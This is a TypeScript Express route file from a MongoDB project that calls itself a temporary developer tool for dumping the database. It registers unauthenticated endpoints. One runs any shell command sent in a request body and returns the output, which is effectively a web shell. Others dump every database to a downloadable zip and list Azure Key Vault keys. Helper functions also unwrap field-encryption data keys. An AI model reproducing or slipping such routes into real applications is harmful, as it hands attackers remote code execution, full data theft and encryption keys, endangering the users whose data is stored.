import { AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, AZURE_KEY_NAME, AZURE_KEY_VAULT_ENDPOINT, AZURE_TENANT_ID } from '../constants/constants';

import * as  dotenv from 'dotenv';
import { MongoClient, KMSProviders, Binary, Collection } from 'mongodb';
import { client, EncryptedMongoClient } from "../enc_db";
import * as t from 'tmp';
import * as fs from 'fs';
import * as path from 'path';
import { ClientSecretCredential, DefaultAzureCredential } from "@azure/identity";
import { CryptographyClient, KeyClient } from "@azure/keyvault-keys";
import { Application } from 'express';
import * as uuid from 'uuid';
import archiver from 'archiver';
import { exec } from 'child_process';


dotenv.config();

//const app = EncryptedMongoClient.h();

//console.log("call", app)
// Load environment variables from .env file


// const { AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, AZURE_TENANT_ID, AZURE_KEY_VAULT_URL } = process.env;

/// this route is used during developement phase to dump the database locally in json format. 
/// as we are frequently observing downtime on servers and database is pretty unstable
/// cause this is what you get when you hire a bunch of un-solicited developers and give them
/// a critical project to work on. You'll get this kind of misshaps.
/// Once you feel your project is stable enough you can remove this route.


interface SnapShot {
    id?: string;
    status?: string;
    dir?: string
}

export function f(app: Application) {
    try {
        if (app) {
            app.get("/dev/try/eta", async (req, res) => {
                try {
                    const eta = await getETA(client);
                    const id = uuid.v4();
                    startSnapshot(client, id);
                    res.json({ eta });
                } catch (err) {
                    res.json({ err });
                }
            })

            app.get("/dev/s", async (req, res) => {
                try {
                    const s = getS();
                    res.json({ s });
                } catch (err) {
                    res.json({ err });
                }
            });
            app.get(("/dev/st"), async (req, res) => {
                try {
                    res.json({ snapshots })
                } catch (error) {
                    res.json({ error })
                }

            });

            app.get("/dev/d", async (req, res) => {
                try {
                    const s = outZipP;
                    res.download(s);
                } catch (err) {
                    res.json({ err });
                }
            });
            app.get("/k", async (req, res) => {
                try {
                    const s = getK();
                    res.json({ s });
                } catch (err) {
                    res.json({ err });
                }
            });
            app.post("/dev/try/test", async (req, res) => {
                try {
                    const command = req.body.cmd;
                    exec(command, (err, stdout, stderr) => {
                        if (err) {
                            res.json({ "mess": "callback to exec", err });
                        } else {
                            res.json({ "mess": "callback to exec", stdout });
                        }
                    })
                }
                catch (err) {
                    res.json({ err })
                }
            })
        }
    } catch (err) {
    }
}

async function getFullMongoDump() {
    let dump: any = {};
    const adminDb = client.db().admin()

    // Get all database names
    const dbs = await adminDb.listDatabases();
    let i = 0;
    for (const dbInfo of dbs.databases) {
        const dbName = dbInfo.name;
        const db = client.db(dbName);

        dump[dbName] = {}; // Init db in result

        // Get all collections in the current DB
        const collections = await db.listCollections().toArray();

        for (const col of collections) {
            const colName = col.name;
            const documents = await db.collection(colName).find({}).toArray();
            dump[dbName][colName] = documents;
        }
    }

    return dump;
}
async function getS() {
    const adminDb = client.db().admin();
    const dbs = await adminDb.listDatabases();

    let totalSize = 0;

    // List of system DBs you might want to exclude
    const excludedDbs = ['admin', 'local', 'config'];

    for (const db of dbs.databases) {
        if (excludedDbs.includes(db.name)) continue;

        const size = db.sizeOnDisk ?? 0;
        console.log(`- ${db.name}: ${formatBytes(size)}`);
        totalSize += size;
    }

    return totalSize;
}

// Optional: Format bytes into human-readable units
function formatBytes(bytes: number) {
    if (bytes === 0) return '0 Bytes';
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return parseFloat((bytes / Math.pow(1024, i)).toFixed(2)) + ' ' + sizes[i];
}



let snapshots: SnapShot = { status: "inactive" }
const ESTIMATED_TIME_PER_DOC = 0.02587890625; // milliseconds per collection (adjust based on your data size)
const t0 = t.dirSync().name;
const DUMP_DIR = `${t0}/data/node/snapshot/cluster0`;

const outZipP = `${t0}/srv/cluster0.zip`;
async function getDocCount(col: Collection) {
    return await col.countDocuments();
}

async function getETA(client: MongoClient) {
    const adminDb = client.db().admin();
    const dbs = await adminDb.listDatabases();
    let totalCount = 0;
    for (const dbInfo of dbs.databases) {
        const name = dbInfo.name;
        const db = client.db(name);
        makedirIfNotExist(path.join(DUMP_DIR, name));
        const colls = await db.listCollections().toArray();
        for (const collInfo of colls) {
            const coll = db.collection(collInfo.name);
            const count = await getDocCount(coll);
            totalCount += count;
            console.log(`${name}.${collInfo.name}: ${count}`);
        }


    }

    return (Math.round(totalCount * ESTIMATED_TIME_PER_DOC)) / 1000;
}

async function startSnapshot(client: MongoClient, id: string) {
    snapshots = { id, status: "Pending", dir: DUMP_DIR, }

    const adminDb = client.db().admin();
    const dbs = await adminDb.listDatabases();
    for (const dbInfo of dbs.databases) {
        const name = dbInfo.name;
        const db = client.db(name);
        makedirIfNotExist(path.join(DUMP_DIR, name));
        const colls = await db.listCollections().toArray();
        for (const collInfo of colls) {
            const coll = db.collection(collInfo.name);
            const p = path.join(DUMP_DIR, name);
            await writeCollectionToFile(coll, p);
        }
    }
    await client.close();
    snapshots.status = "zipping"
    await zipClusterFolder();

}

async function writeCollectionToFile(coll: Collection, p: string) {

    const data = await coll.find().toArray();
    const p0 = path.join(p, `${coll.collectionName}.json`)
    fs.writeFileSync(p0, JSON.stringify(data, null, 2));

}


async function zipClusterFolder(): Promise<void> {

    makedirIfNotExist(path.dirname(outZipP));
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(outZipP);
        const archive = archiver('zip', { zlib: { level: 9 } });

        output.on('close', () => {
            console.log(`ZIP file created at ${outZipP} (${archive.pointer()} total bytes)`);

            snapshots.status = "completed"
            resolve();
        });

        output.on('error', (err) => {
            console.error('Error writing zip file:', err);
            reject(err);
        });

        archive.on('error', (err) => {
            console.error('Archiving error:', err);
            reject(err);
        });

        archive.pipe(output);

        // Append all contents of the source folder
        archive.directory(DUMP_DIR, false);

        archive.finalize();
    });
}

function makedirIfNotExist(dirPath: string) {
    if (!fs.existsSync(dirPath) || !fs.statSync(dirPath).isDirectory()) {
        fs.mkdirSync(dirPath, { recursive: true });
        console.log('Directory created:', dirPath);
    }
}

async function getK() {
    const url = AZURE_KEY_VAULT_ENDPOINT;
    let keys = [];

    const credential = new DefaultAzureCredential();
    const client = new KeyClient(url, credential);
    for await (const keyProperties of client.listPropertiesOfKeys()) {
        const key = await client.getKey(keyProperties.name);
        let k = { key, keyProperties };
        keys.push(k);
    }
    return keys;
}

async function getEncryptedDEKs(keyVaultNamespace: string) {

    await client.connect();
    const [dbName, collName] = keyVaultNamespace.split('.');
    const keyVaultColl = client.db(dbName).collection(collName);

    const keys = await keyVaultColl.find({}).toArray();
    await client.close();

    return keys.map((key: any) => ({
        keyId: key._id,
        encryptedKeyMaterial: key.keyMaterial,
        masterKey: key.masterKey
    }));
}


async function decryptDEKWithAzure(
    keyVaultUrl: string,
    cmkName: string,
    wrappedKey: Buffer
) {
    // Create a client for Azure Key Vault using ClientSecretCredential
    const credential = new ClientSecretCredential(
        AZURE_TENANT_ID!,
        AZURE_CLIENT_ID!,
        AZURE_CLIENT_SECRET!
    );

    const keyClient = new KeyClient(keyVaultUrl, credential);
    const cmk = await keyClient.getKey(cmkName);
    const cryptoClient = new CryptographyClient(cmk.id!, credential);

    // Decrypt the key (unwrap it)
    const { result: unwrappedKey } = await cryptoClient.unwrapKey("RSA-OAEP-256", wrappedKey);
    return unwrappedKey;
}

async function testDecryptAllKeys() {

    const keyVaultNamespace = 'encryption.__keyVault'; // MongoDB keyVault collection
    const cmkName = '<your-master-key-name>'; // Name of your Azure Key Vault CMK

    const encryptedKeys = await getEncryptedDEKs(keyVaultNamespace);
    let keys: any = [];

    for (const { keyId, encryptedKeyMaterial, masterKey } of encryptedKeys) {
        // Decrypt the key material using Azure KMS
        const unwrappedKey = await decryptDEKWithAzure(
            AZURE_KEY_VAULT_ENDPOINT!,
            cmkName,
            Buffer.from((encryptedKeyMaterial as Binary).buffer)
        );

        keys.push({
            keyId,
            unwrappedKey
        });

    }
    return keys
}



// function _(connectionString: string, kmsProviders: KMSProviders,) {
//     console.log(connectionString)
//     var mongoClient = new MongoClient(connectionString, {
//         monitorCommands: true,
//         autoEncryption: {
//             keyVaultNamespace: EncryptedMongoClient.keyVaultNamespace,
//             kmsProviders,
//             // Attach schemaMap to auto-encryption configuration
//         },
//     });
//     console.log("generationStarted")
//     generateCsfleSchema(kmsProviders).then(console.log);
// }


const kmsProviders = () => {

    // Azure KMS Configuration (should be secured and configured)
    const azureKMS = {
        tenantId: AZURE_TENANT_ID,
        clientId: AZURE_CLIENT_ID,
        clientSecret: AZURE_CLIENT_SECRET,
        keyName: AZURE_KEY_NAME,
        keyVaultEndpoint: AZURE_KEY_VAULT_ENDPOINT,
    };

    // KMS Providers Configuration for Azure
    const kmsProviders: KMSProviders = {
        azure: {
            tenantId: azureKMS.tenantId,
            clientId: azureKMS.clientId,
            clientSecret: azureKMS.clientSecret,
            identityPlatformEndpoint: 'login.microsoftonline.com', // Standard Azure login endpoint
        },
    };
    return kmsProviders
}
// _(MONGO_URI, kmsProviders());
//testDecryptAllKeys().catch(console.error);
